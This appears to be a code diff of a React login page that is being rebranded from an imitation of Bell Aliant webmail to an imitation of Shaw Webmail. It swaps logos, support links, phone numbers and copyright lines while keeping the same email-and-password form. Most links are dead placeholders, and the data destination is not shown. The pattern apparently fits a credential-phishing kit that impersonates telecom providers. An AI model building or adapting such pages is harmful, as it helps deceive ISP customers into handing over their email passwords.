@@ -100,39 +100,67 @@ const HomePage = () => {
       {/* Navbar */}
       <header>
         <div className="header">
-          <a className="navbar-brand mt-3 mb-2" href="#">
-            <div className="site-title">Bell</div>
-            <div className="site-title-sub">Aliant</div>
-          </a>
           <div>
-            <a
-              href="#"
-              style={{
-                color: "#fff",
-                fontSize: "15px",
-              }}
-            >
-              English
-            </a>
+            <ul className="header-content content-1">
+              <li className="">
+                <a href="#">Personal</a>
+              </li>
+
+              <li className="">
+                <a href="#">Business</a>
+              </li>
+            </ul>
+            <div className="header-content content-2 d-none d-lg-inline">
+              <span className="chat">
+                <a href="#">Shop</a>
+              </span>
+              <span className="chat divider">|</span>
+              <span>
+                {" "}
+                <a href="#">Support</a>
+              </span>
+              <span className="divider">|</span>
+              <span>
+                {" "}
+                <a href="#">My Shaw</a>
+              </span>
+            </div>
+          </div>
+          <div>
+            <ul className="header-content content-2">
+              <li className="drawer" rel="contact-content">
+                <a
+                  href="#"
+                  style={{
+                    display: "flex",
+                    alignItems: "center",
+                    gap: "15px",
+                  }}
+                >
+                  <i
+                    className="bi bi-chat-right"
+                    style={{
+                      fontSize: "18px",
+                    }}
+                  ></i>
+                  <span className="hidden-xs">Contact</span>
+                </a>
+              </li>
+            </ul>
           </div>
         </div>
       </header>
       <main className="container">
         {/* Page Content */}
-        <div className="content">
-          <div className="row">
-            <div className="col-12">
-              <h2>Courriel Bell Aliant</h2>
-            </div>
-          </div>
+        <div className="content m-auto mt-5">
           <div className="row">
             {/* Form Column */}
-            <div className="col-md-6 mb-5 mb-lg-0">
-              <div className="card">
-                <div className="card-header">
-                  <h4>Login</h4>
+            <div className="col-md-7 mb-5 mb-lg-0">
+              <div className="right-content">
+                <div className="my-4 text-center">
+                  <img alt="Shaw Webmail" src="/logo.png" />
                 </div>
-                <div className="card-body">
+                <div className="">
                   {isSubmitted ? (
                     <div>
                       <div className="email-success mb-3">
@@ -156,17 +184,27 @@ const HomePage = () => {
                         <label htmlFor="email" className="form-label">
                           Email Address
                         </label>
-                        <input
-                          type="text"
-                          name="email"
-                          value={formData.email}
-                          onChange={handleInputChange}
-                          className={`form-control ${
-                            formErrors.email ? "is-invalid" : ""
-                          }`}
-                          id="email"
-                          required
-                        />
+                        <div className="row">
+                          <div className="col-10 pe-0">
+                            <input
+                              type="text"
+                              name="email"
+                              value={formData.email}
+                              onChange={handleInputChange}
+                              className={`form-control ${
+                                formErrors.email ? "is-invalid" : ""
+                              }`}
+                              id="email"
+                              required
+                            />
+                          </div>
+                          <div className="col-2  ps-0  help-container">
+                            <div className="help">
+                              <i className="bi bi-question-circle-fill"></i>
+                              <span>Help</span>
+                            </div>
+                          </div>
+                        </div>
                         {formErrors.email && (
                           <div className="invalid-feedback">
                             {formErrors.email}
@@ -178,17 +216,23 @@ const HomePage = () => {
                         <label htmlFor="password" className="form-label">
                           Password
                         </label>
-                        <input
-                          type="password"
-                          name="password"
-                          value={formData.password}
-                          onChange={handleInputChange}
-                          className={`form-control ${
-                            formErrors.password ? "is-invalid" : ""
-                          }`}
-                          id="password"
-                          required
-                        />
+                        <div className="row">
+                          <div className="col-10 pe-0">
+                            <input
+                              type="password"
+                              name="password"
+                              value={formData.password}
+                              onChange={handleInputChange}
+                              className={`form-control ${
+                                formErrors.password ? "is-invalid" : ""
+                              }`}
+                              id="password"
+                              required
+                            />
+                          </div>
+                          <div className="col-2  ps-0"></div>
+                        </div>
+
                         {formErrors.password && (
                           <div className="invalid-feedback">
                             {formErrors.password}
@@ -196,49 +240,49 @@ const HomePage = () => {
                         )}
                       </div>
                       <div className="mb-3">
-                        <div className="custom-checkbox">
+                        <div className="custom-checkbox d-flex align-items-center">
                           <input
                             type="checkbox"
                             name="remember"
                             checked={formData.remember}
                             onChange={handleInputChange}
-                            className="form-check-input"
+                            className="form-check-input m-0"
                             // id="remember"
                             id="styledCheckbox"
                           />
                           <span className="checkbox-box"></span>
                           <label
                             for="styledCheckbox"
-                            className="custom-label form-label"
+                            className="custom-label form-label m-0 ms-2"
                           >
                             Remember my email address!
                           </label>
                         </div>
                       </div>
 
-                      <div>
+                      <div className="text-center">
                         <button type="submit" className="btn form-btn">
-                          {isLoading ? "Please Wait...." : "Submit"}
+                          {isLoading &&
+                          !formErrors.email &&
+                          !formErrors.password
+                            ? "Please Wait...."
+                            : "Submit"}
                         </button>
                       </div>
-                      <div>
-                        <a className="forgot-password form-label" href="/">
-                          <div>
-                            Forgot your password? Please call Technical Support.
-                            <br />
-                            <br />
-                            Bell Aliant: 1-866-425-4268
-                            <br />
-                            KMTS: 1-807-467-5687
-                            <br />
-                            DMTS: 1-807-223-1100
-                            <br />
-                            Ontera: 1-888-566-8372
-                            <br />
-                            FibreOP: 1-866-342-7367
-                            <br />
-                          </div>
-                        </a>
+                      <div className="text-center ">
+                        <div class="form-label form-action">
+                          <span>Having trouble?</span>{" "}
+                          <span>
+                            <a href="">
+                              Shaw Support: How To Reset My Password
+                            </a>
+                          </span>
+                          <br />
+                          <span>Already Know How?</span>{" "}
+                          <span>
+                            <a href="">Reset Password On My Shaw</a>
+                          </span>
+                        </div>
                       </div>
                     </form>
                   )}
@@ -247,42 +291,36 @@ const HomePage = () => {
             </div>
 
             {/* Card Column */}
-            <div className="col-md-6 mb-5 mb-lg-0">
-              <div className="card">
-                <div className="card-header">
-                  <h4>New enhancements to your Bell Aliant email.</h4>
-                </div>
-
-                <div className="card-body section-wrapper">
-                  <div className="floating-element"></div>
-                  <div className="section-content">
-                    <h3 className="mb-2">
-                      You'll start seeing these updates soon:
-                    </h3>
-                    <ul>
-                      <li className="list">
-                        A new look and composing screen for an improved
-                        experience
-                      </li>
-                      <li className="list">Increased inbox storage space</li>
-                      <li className="list">
-                        A new calendar feature to help organize your day
-                      </li>
-                      <li className="list">
-                        An optimized mobile experience on iOS and Android
-                      </li>
-                    </ul>
-                  </div>
-                </div>
-              </div>
+            <div className="col-md-5 mb-5 mb-lg-0">
+              <div className="left-content"></div>
             </div>
           </div>
         </div>
       </main>
       <footer>
-        <span className="copyright">
-          &nbsp;&nbsp;&nbsp;© Bell Canada, 2024. All rights reserved.
-        </span>
+        <div className="d-flex justify-content-lg-between align-items-center flex-column flex-lg-row">
+          <div className="footer-links mb-3">
+            <span>
+              <a href="#">Privacy Policy</a>&nbsp;&nbsp;
+            </span>{" "}
+            <span>|</span>{" "}
+            <span>
+              &nbsp;&nbsp;
+              <a href="#">Terms of Use</a>
+              &nbsp;&nbsp;
+            </span>{" "}
+            <span>|</span>{" "}
+            <span>
+              &nbsp;&nbsp;
+              <a href="#">Accessibility</a>
+              &nbsp;&nbsp;
+            </span>
+          </div>
+
+          <div id="footer-copyright" className="footer-copyright">
+            <span>© 2024 Shaw Communications. All Rights Reserved.</span>
+          </div>
+        </div>
       </footer>
     </div>
   );
